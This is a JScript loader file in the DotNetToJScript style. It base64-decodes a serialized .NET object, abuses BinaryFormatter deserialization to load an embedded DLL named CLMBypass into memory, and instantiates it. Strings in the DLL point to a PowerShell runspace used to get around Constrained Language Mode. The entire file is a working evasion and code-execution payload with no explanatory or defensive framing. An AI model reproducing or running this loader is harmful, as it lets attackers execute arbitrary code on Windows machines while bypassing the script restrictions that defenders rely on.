function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABIAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAUOfytwAAAAAA"+
"AAAA4AAiIAsBMAAACgAAAAYAAAAAAABqKAAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAFigA"+
"AE8AAAAAQAAAeAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAHwnAAA4AAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
"AAAALnRleHQAAABwCAAAACAAAAAKAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAeAMAAABA"+
"AAAABAAAAAwAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAQAAAAAAAAAAAA"+
"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAEooAAAAAAAASAAAAAIABQCcIAAA4AYAAAEAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzACADcAAAAB"+
"AAARACgPAAAKCgZvEAAACgAoEQAACgsHBm8SAAAKAAIWmgwHCG8TAAAKJgdvFAAACiYGbxUAAAoA"+
"KiICKBYAAAoAKkJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAACACAAAjfgAAjAIA"+
"AAgDAAAjU3RyaW5ncwAAAACUBQAABAAAACNVUwCYBQAAEAAAACNHVUlEAAAAqAUAADgBAAAjQmxv"+
"YgAAAAAAAAACAAABRxUCAAkAAAAA+gEzABYAAAEAAAAVAAAAAgAAAAIAAAABAAAAFgAAAA4AAAAB"+
"AAAAAQAAAAIAAAAAAO4BAQAAAAAABgAqAaYCBgCXAaYCBgBeAE0CDwDGAgAABgCGADUCBgANATUC"+
"BgDuADUCBgB+ATUCBgBKATUCBgBjATUCBgCdADUCBgByAIcCBgBQAIcCBgDRADUCBgC4ALUBBgDm"+
"AgcCCgAzAGACCgD8ARgCCgD3AmACBgABAM8BCgDkAhgCAAAAAA4AAAAAAAEAAQABABAA2gLaAkEA"+
"AQABAFAgAAAAAJEAEwJTAAEAkyAAAAAAhhhHAgYAAgAAAAEA1QIJAEcCAQARAEcCBgAZAEcCCgAp"+
"AEcCEAAxAEcCEAA5AEcCEABBAEcCEABJAEcCEABRAEcCEABZAEcCEABhAEcCFQBpAEcCEABxAEcC"+
"EAB5AEcCEACZAC0AIgCJAA4CBgCRAEkAJwCRACAALACRAO0CMgCRADwAOACJAEMABgCBAEcCBgAu"+
"AAsAWQAuABMAYgAuABsAgQAuACMAigAuACsAmQAuADMAmQAuADsAmQAuAEMAigAuAEsAnwAuAFMA"+
"mQAuAFsAmQAuAGMAtwAuAGsA4QAuAHMA7gAaAASAAAABAAAAAAAAAAAAAAAAANoCAAAEAAAAAAAA"+
"AAAAAABBABcAAAAAAAEAAAAAAAAAAAAAAEoAGAIAAAAAAAAAQ29sbGVjdGlvbmAxADxNb2R1bGU+"+
"AG1zY29ybGliAHNldF9SdW5zcGFjZQBDcmVhdGVSdW5zcGFjZQBJbnZva2UAQ2xvc2UAQ3JlYXRl"+
"AEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFz"+
"c2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAVGFyZ2V0RnJh"+
"bWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25m"+
"aWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRp"+
"b25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlD"+
"b3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRp"+
"YmlsaXR5QXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAU3lzdGVtLkNvbGxlY3Rp"+
"b25zLk9iamVjdE1vZGVsAENMTUJ5cGFzcy5kbGwAUG93ZXJTaGVsbABTeXN0ZW0AT3BlbgBNYWlu"+
"AFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24ALmN0b3IAU3lz"+
"dGVtLkRpYWdub3N0aWNzAFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVuc3BhY2VzAFN5"+
"c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZp"+
"Y2VzAERlYnVnZ2luZ01vZGVzAGFyZ3MAQ0xNQnlwYXNzAFBTT2JqZWN0AEFkZFNjcmlwdABSdW5z"+
"cGFjZUZhY3RvcnkAAAAAAAALiveNJ2RTS5DwqK/HuiJhAAQgAQEIAyAAAQUgAQEREQQgAQEOBCAB"+
"AQIHBwMSRRJJDgQAABJFBAAAEkkFIAEBEkUFIAESSQ4IIAAVElEBElUIt3pcVhk04IkIMb84Vq02"+
"TjUFAAEBHQ4IAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEABwEAAAAA"+
"DgEACUNMTUJ5cGFzcwAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAgMjAxOQAAKQEAJGI0YjhiZmJi"+
"LTI3NmMtNDBmMy05ZTQxLWE3MjZjZDEwMmVhNQAADAEABzEuMC4wLjAAAEcBABouTkVURnJhbWV3"+
"b3JrLFZlcnNpb249djQuMAEAVA4URnJhbWV3b3JrRGlzcGxheU5hbWUQLk5FVCBGcmFtZXdvcmsg"+
"NAAAAAAAAB3O4eQAAAAAAgAAAGIAAAC0JwAAtAkAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAA"+
"AABSU0RTtRwLcAKFwE+7lTZjjk+TcgEAAABDOlxVc2Vyc1xjb2RlYXRoXHNvdXJjZVxyZXBvc1xD"+
"TE1CeXBhc3NcQ0xNQnlwYXNzXG9ialxEZWJ1Z1xDTE1CeXBhc3MucGRiAD4oAAAAAAAAAAAAAFgo"+
"AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAABKKAAAAAAAAAAAAAAAAF9Db3JEbGxNYWluAG1zY29y"+
"ZWUuZGxsAAAAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAA"+
"AAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAAHAMAAAAAAAAAAAAAHAM0AAAA"+
"VgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAA"+
"AD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8A"+
"AAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBHwCAAABAFMAdAByAGkAbgBn"+
"AEYAaQBsAGUASQBuAGYAbwAAAFgCAAABADAAMAAwADAAMAA0AGIAMAAAABoAAQABAEMAbwBtAG0A"+
"ZQBuAHQAcwAAAAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAAAAAAAAA8AAoAAQBG"+
"AGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAQwBMAE0AQgB5AHAAYQBzAHMAAAAwAAgA"+
"AQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA8AA4AAQBJAG4AdABl"+
"AHIAbgBhAGwATgBhAG0AZQAAAEMATABNAEIAeQBwAGEAcwBzAC4AZABsAGwAAABIABIAAQBMAGUA"+
"ZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAgADIAMAAx"+
"ADkAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAEQADgABAE8A"+
"cgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABDAEwATQBCAHkAcABhAHMAcwAuAGQAbABs"+
"AAAANAAKAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABDAEwATQBCAHkAcABhAHMAcwAAADQA"+
"CAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBB"+
"AHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAABsOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVm"+
"bGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA";
var entry_class = 'CLMBypass.CLMBypass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}